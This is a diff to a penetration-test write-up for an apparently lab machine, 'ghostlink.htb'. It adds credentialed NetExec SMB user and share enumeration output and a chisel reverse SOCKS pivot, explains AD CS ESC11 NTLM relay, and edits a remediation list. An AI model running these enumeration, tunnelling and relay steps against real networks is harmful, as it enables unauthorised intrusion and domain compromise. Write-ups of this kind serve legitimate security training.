@@ -459,12 +459,39 @@ nvirelli@gpz-op26-toolkits:~$ cat user.txt
 
 ## Privilege Escalation
 
-### Enumeration
+### Users and shares numeration
 
 ```
 nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
-...
-SMB  ... [*] Enumerated 11 local users: GHOSTLINK
+SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
+SMB         10.129.191.32   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.191.32   445    DC01             Administrator                 2026-04-10 04:34:52 0       Built-in account for administering the computer/domain 
+SMB         10.129.191.32   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.191.32   445    DC01             krbtgt                        2026-02-24 00:14:01 0       Key Distribution Center Service Account 
+SMB         10.129.191.32   445    DC01             nvirelli                      2026-03-03 20:35:06 0       Identity and federation specialist 
+SMB         10.129.191.32   445    DC01             kdraven                       2026-02-24 00:18:33 0       Defensive intelligence 
+SMB         10.129.191.32   445    DC01             zkovacs                       2026-02-24 00:18:34 0       Cryptography and signing workflows 
+SMB         10.129.191.32   445    DC01             ohexley                       2026-02-24 00:18:34 0       Binary analysis and reverse engineering 
+SMB         10.129.191.32   445    DC01             vroth                         2026-02-24 00:18:34 0       Automation and script development 
+SMB         10.129.191.32   445    DC01             dsoren                        2026-02-24 00:18:34 0       Digital forensics and incident response 
+SMB         10.129.191.32   445    DC01             lnoctis                       2026-02-24 00:18:34 0       Open source intelligence 
+SMB         10.129.191.32   445    DC01             svc_canary                    2026-02-24 14:37:09 0       Healthcheck Canary for Anika Jensen 
+SMB         10.129.191.32   445    DC01             [*] Enumerated 11 local users: GHOSTLINK
+```
+
+```
+nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --shares
+SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
+SMB         10.129.191.32   445    DC01             [*] Enumerated shares
+SMB         10.129.191.32   445    DC01             Share           Permissions     Remark
+SMB         10.129.191.32   445    DC01             -----           -----------     ------
+SMB         10.129.191.32   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.191.32   445    DC01             C$                              Default share
+SMB         10.129.191.32   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.191.32   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.191.32   445    DC01             SYSVOL          READ            Logon server share
 ```
 
 No immediately exploitable shares or BloodHound edges turn up with `nvirelli`'s rights. Deeper access requires reaching the internal `172.16.20.0/24` segment where the certificate authority lives, so a chisel SOCKS tunnel is built from the already-compromised toolkits host:
@@ -474,7 +501,6 @@ No immediately exploitable shares or BloodHound edges turn up with `nvirelli`'s 
 ```
 ./chisel server -v -p 1234 --reverse --socks5
 ```
-
 
 >gpz-op26-toolkits
 
@@ -500,7 +526,7 @@ Certificate Authorities
     ESC11 : Encryption is not enforced for ICPR (RPC) requests.
 ```
 
-**ESC11** is the RPC cousin of ESC8: a certificate authority can be configured to require signing/sealing on ICPR (certificate enrollment) RPC calls via the `IF_ENFORCEENCRYPTICPR` flag. When that's disabled, an NTLM authentication captured over RPC can be relayed straight into the CA — exactly like ESC8 relays an HTTP login — letting an attacker request a certificate _as whoever authenticates_, including a domain controller's own machine account.
+**ESC11** is the RPC cousin of ESC8: a certificate authority can be configured to require signing/sealing on ICPR (certificate enrollment) RPC calls via the `IF_ENFORCEENCRYPTICPR` flag. When that's disabled, an NTLM authentication captured over RPC can be relayed straight into the CA, exactly like ESC8 relays an HTTP login, letting an attacker request a certificate _as whoever authenticates_, including a domain controller's own machine account.
 
 ### Exploiting ESC11
 
@@ -565,11 +591,8 @@ ebe6de5acd30469507826e1c1f8a3563
 - **Double URL-encoded path traversal in `/api/download`:** Fully decode the input before validating, then canonicalize and confirm the resolved path stays inside the intended directory. Prefer opaque, server-generated tokens over client-influenced file paths entirely.
 - **Sensitive credential store reachable via LFI:** A KeePass database and its key file were stored together, unencrypted at rest beyond the database itself, inside a regular user profile reachable from a web-facing LFI. Keep key files off the same host/share as the database they unlock, and restrict where credential stores can be written.
 - **CVE-2025-8110 (Gogs symlink RCE):** Upgrade Gogs past 0.13.3. Validate that content-API writes never resolve through a symlink outside the intended repository path.
-- **Crackable application password hashes:** `nvirelli`'s Gogs password was recoverable from rockyou. Enforce a strong password policy, and never reuse an application-level password for a local OS account.
 - **ESC8 / ESC11 on AD CS:** Disable HTTP web enrollment or require HTTPS with channel binding (ESC8), and enable `IF_ENFORCEENCRYPTICPR` so RPC-based certificate requests require signing/sealing (ESC11), closing off NTLM relay to the CA entirely.
 - **Multi-protocol coercion against the DC:** Patch/mitigate known forced-authentication vectors (PetitPotam, PrinterBug, DFSCoerce, etc.), enable SMB signing domain-wide, and monitor for unexpected inbound RPC/SMB connection attempts to non-DC hosts.
-- **DC machine account certificates enabling DCSync:** Monitor Certificate Services logs for `DomainController`-template issuance requested by anything other than the legitimate DC's own enrollment process.
-
 ---
 
 ## References
